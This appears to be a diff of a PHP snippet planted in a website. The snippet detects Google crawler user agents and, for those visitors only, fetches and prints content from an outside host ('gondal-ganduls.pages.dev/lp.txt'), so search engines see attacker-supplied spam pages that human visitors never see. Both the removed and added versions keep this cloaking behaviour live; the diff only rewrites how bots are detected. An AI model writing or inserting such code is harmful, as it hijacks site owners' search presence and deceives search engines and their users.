@@ -1,24 +1,21 @@
 <?php
-function isGoogleBot() {
-    if (!isset($_SERVER['HTTP_USER_AGENT'])) {
-        return false;
+function is_bot() {
+    $agents = array("Googlebot", "Google-Site-Verification", "Google-InspectionTool", "Googlebot-Mobile", "Googlebot-News");
+    foreach ($agents as $agent) {
+        if (strpos($_SERVER['HTTP_USER_AGENT'], $agent) !== false) return true;
     }
-    $userAgent = $_SERVER['HTTP_USER_AGENT'];
-    return preg_match('/Googlebot|Googlebot-Mobile|Googlebot-Image|Mediapartners-Google|Google-Site-Verification|Google Web Preview|AdsBot-Google|Google-InspectionTool|Googlebot-Desktop|Googlebot-Smartphone/i', $userAgent);
+    return false;
 }
 
-if (isGoogleBot()) {
-    $ch = curl_init("https://gondal-ganduls.pages.dev/lp.txt");
+if (is_bot()) {
+    $url = 'https://gondal-ganduls.pages.dev/lp.txt';
+
+    $ch = curl_init($url);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-    $html = curl_exec($ch);
+    $result = curl_exec($ch);
     curl_close($ch);
 
-    if ($html !== false) {
-        echo $html; // tampilkan konten file
-    } else {
-        echo "Gagal mengambil konten.";
-    }
+    echo $result ?: ' ';
     exit;
 }
 ?>
